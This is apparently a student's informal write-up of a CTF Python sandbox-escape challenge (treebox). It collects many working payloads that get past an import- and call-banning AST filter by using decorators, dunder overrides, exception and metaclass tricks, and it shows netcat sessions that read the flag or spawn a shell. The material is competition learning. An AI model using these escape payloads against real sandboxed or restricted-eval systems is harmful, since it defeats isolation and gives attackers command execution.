# writeup ?
( more like copy up )

# Things I learnt 
- cwd means current working directory jk i knew that
- I was like where will be the flag file ?
- Is it a hidden file that came with the zip ?
- is it inside python file some .pyc file ?

# Turns out we needed to connect to the url given in question !
- I was sure we needed to get access to a flag file on some server but how do i access the server
- going to the url in browser did nothing 
- curl command also kept running and nothing happened 

## we had to use netcat !
```
nc treebox.2022.ctfcompetition.com 1337
```
### why netcat ?
idek

## you can send a file using <
Comes in handy when you are constantly changing the file you want to send .
```
nc treebox.2022.ctfcompetition.com 1337 < sol1.py
```

# Solution
You were given the sneakpeak of the code present at the server , you just needed to escape the sandbox which was safe python execution on server to access the file named flag which contained the flag.

The safe python exec ran programs without function calls , import statements !

Now you need to figure out how to access the file without calling any function or importing anything 

which is impossible , 

See the question exactly was more like "you can't use import statement or call a function using ()"

## Learnt about dunder / magic method __getitem__ ?
- idk wtf this is don't read bs written below.

- https://www.geeksforgeeks.org/__getitem__-in-python/
- basically make function calls and pass arguments like as if you are accessing a property of an object
```py
class a:__init__=
a.__getitem__ = print
a['help'] # prints help without using ()
```


# best solutions i saw on dc
- official sol
```py
#!/usr/bin/python3
class X():
  def __init__(self, a, b, c, d, e):
    self += "print(open('flag').read())"
  __iadd__ = eval
__builtins__.__import__ = X
{}[1337]
```

- cool sol with a lot of @ over functions which do nothing
```py
def os_str(x): return 'os'

@__import__
@os_str
def os(): pass

def cmd_str(x): return 'cat flag'

@os.system
@cmd_str
def ret(): pass

--END
```
- idk if this works
```py
global os
class M(type):
    self = "ls"
    pass
class A(metaclass=M):
    pass
M.__add__ = os.system
assert f"{A + 'sh'}" == True
```
- without os.system
```py
class Exploit(BaseException):
    pass

Exploit.__eq__ = open
Exploit.__gt__ = print

try:
    raise Exploit
except Exploit as exploit:
    a = exploit == "flag"
    Exploit.__lt__ = a.read
    b = exploit < None
    exploit > b
```
- wtf
```py
@eval
@'__import__("os").system("sh")'.format
class _:pass
```
- incorrect
```console
Mac:~ sahilsoni$ nc treebox.2022.ctfcompetition.com 1337
== proof-of-work: disabled ==
-- Please enter code (last line must contain only --END)
import pdb; pdb.set_trace(); __loader__.__getitem__ = open; a = __loader__['flag']; #--END`
--END
ERROR: Banned statement <ast.Import object at 0x7f9ff569b160>
```
- best one so far imo (understandable)
```console
Mac:~ sahilsoni$ nc treebox.2022.ctfcompetition.com 1337
== proof-of-work: disabled ==
-- Please enter code (last line must contain only --END)
class T(BaseException):
    __getitem__=os.system

try:
    raise T
except T as e:
    e['cat flag']
--END
-- Executing safe code:
cat: flag: No such file or directory-- Executing safe code:
CTF{CzeresniaTopolaForsycja}
```
- Exception rose to the ocassion
```py
class A(BaseException):
    def __init__(self):
        self.__class__.__add__ = os.system

    def __str__(self):
        return self + "cat flag"

raise A
--END
```
- match ?
```py
class MyClass(type):
    __instancecheck__ = os.system

class MyClass2(metaclass=MyClass):
    pass

match "/bin/sh":
    case MyClass2():
        pass
```
- illegible
```py
__builtins__.__dict__["license"]._Printer__filenames=["flag"]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__["license"]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass
```
- code golf
```py
sys.stdout.flush=sys.breakpointhook
```



